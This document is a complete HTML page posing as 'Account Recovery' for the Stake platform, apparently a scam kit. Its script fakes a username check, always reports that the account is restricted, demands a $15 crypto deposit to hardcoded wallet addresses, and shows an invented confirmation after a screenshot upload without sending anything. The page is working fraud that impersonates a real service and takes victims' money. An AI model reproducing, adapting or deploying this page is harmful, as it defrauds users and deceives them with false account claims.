<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ReStake Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #141e30, #243b55);
      color: white;
      padding: 20px;
      margin: 0;
    }

    .container {
      max-width: 500px;
      margin: auto;
      background-color: #1e2a3a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.4);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }

    input[type="file"] {
      background-color: #2c3e50;
      color: white;
    }

    button {
      background-color: #3498db;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #2980b9;
    }

    .copyBtn {
      background-color: #27ae60;
    }

    .message {
      margin-top: 15px;
      padding: 12px;
      background-color: #34495e;
      border-radius: 8px;
      display: none;
    }

    .visible {
      display: block;
    }

    .loader {
      margin: 10px auto;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Account Recovery</h2>

    <input type="text" id="username" placeholder="Enter your username" />
    <button id="verifyBtn" onclick="verifyUsername()">Verify</button>
    <div id="loader" class="loader" style="display:none;"></div>
    <div id="usernameMessage" class="message"></div>

    <select id="cryptoSelect">
      <option value="USDT_TRC20">USDT - TRC20</option>
      <option value="USDT_BSC">USDT - BSC</option>
      <option value="BTC_BSC">BTC - BSC</option>
      <option value="TRX_TRC20">TRX - TRC20</option>
      <option value="TRX_BSC">TRX - BSC</option>
      <option value="ETH_BSC">Ethereum - BSC</option>
    </select>

    <button class="copyBtn" onclick="copyAddress()">Copy Address</button>

    <input type="file" id="screenshot" accept="image/*" />

    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
    <div id="submitMessage" class="message"></div>
  </div>

  <script>
    const cryptoAddresses = {
      USDT_TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
      USDT_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
      BTC_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
      TRX_TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
      TRX_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
      ETH_BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
    };

    function verifyUsername() {
      const username = document.getElementById("username").value.trim();
      if (username === "") {
        alert("Please enter your username.");
        return;
      }

      document.getElementById("loader").style.display = "block";
      document.getElementById("usernameMessage").classList.remove("visible");
      document.getElementById("submitBtn").disabled = true;

      setTimeout(() => {
        document.getElementById("loader").style.display = "none";
        document.getElementById("usernameMessage").innerText =
          "Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.";
        document.getElementById("usernameMessage").classList.add("visible");
        document.getElementById("submitBtn").disabled = false;
      }, 1500);
    }

    function copyAddress() {
      const selected = document.getElementById("cryptoSelect").value;
      const address = cryptoAddresses[selected];

      const tempInput = document.createElement("input");
      document.body.appendChild(tempInput);
      tempInput.value = address;
      tempInput.select();
      document.execCommand("copy");
      document.body.removeChild(tempInput);
      alert("Address copied: " + address);
    }

    function submitForm() {
      const file = document.getElementById("screenshot").files[0];
      if (!file) {
        alert("Please upload the transaction screenshot.");
        return;
      }

      document.getElementById("submitMessage").innerText =
        "Your account recovery request has been received by StakePass. Your Stake account will be fully active within the next 24â€“72 hours.";
      document.getElementById("submitMessage").classList.add("visible");
    }
  </script>
</body>
</html>
